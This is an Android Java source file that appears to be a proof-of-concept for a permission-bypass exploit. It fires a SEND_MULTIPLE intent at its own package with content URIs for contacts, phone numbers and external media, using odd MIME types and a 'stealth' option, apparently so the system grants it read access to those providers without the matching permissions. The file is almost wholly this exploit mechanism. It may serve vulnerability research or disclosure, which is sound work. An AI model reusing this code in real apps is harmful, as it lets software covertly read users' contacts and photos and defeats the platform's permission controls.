package com.digiplex.extra.grantpermissiondemo;

import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.PreferenceActivity;
import android.preference.PreferenceFragment;
import android.preference.PreferenceScreen;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;

import java.util.ArrayList;


public class MainActivity extends PreferenceActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getFragmentManager().beginTransaction().replace(android.R.id.content,
                new PrefsFragment()).commit();

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public void click(View v) {
    }


    public static class PrefsFragment extends PreferenceFragment {

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            // Load the preferences from an XML resource
            addPreferencesFromResource(R.xml.preference);
        }

        @Override
        public boolean onPreferenceTreeClick(PreferenceScreen preferenceScreen, Preference preference) {

            if ("launch".equals(preference.getKey())) {
                getActivity().getPackageManager().clearPackagePreferredActivities(getActivity().getPackageName());
                clickMultiple(false);
            } else if ("providers".equals(preference.getKey())) {
                Intent in = new Intent(getActivity(), ProviderActivity.class);
                startActivity(in);
            }else if ("stealth".equals(preference.getKey())) {
                Intent in = new Intent(getActivity(), ProviderActivity.class);
                clickMultiple(true);
            }

            return true;
        }

        void clickMultiple(boolean stealth) {

            ArrayList<Uri> files = new ArrayList<Uri>();
            files.add(Uri.parse("content://media/external/"));
            files.add(Uri.parse("content://contacts/"));
            files.add(Uri.parse("content://com.android.contacts/"));
            files.add(Uri.parse("content://com.android.contacts/raw_contacts"));
            files.add(Uri.parse("content://com.android.contacts/contacts"));
            files.add(Uri.parse("content://com.android.contacts/data"));
            files.add(Uri.parse("content://com.android.contacts/data/phones"));
            files.add(Uri.parse("content://media/external/images/media"));


            Intent in = new Intent("android.intent.action.SEND_MULTIPLE");
            in.putParcelableArrayListExtra(Intent.EXTRA_STREAM, files);
            if(stealth)
                in.setType("text/x-java");
            else
                in.setType("x-conference/x-cooltalk");
            in.setPackage(getActivity().getPackageName());
            startActivity(in);
        }


    }
}
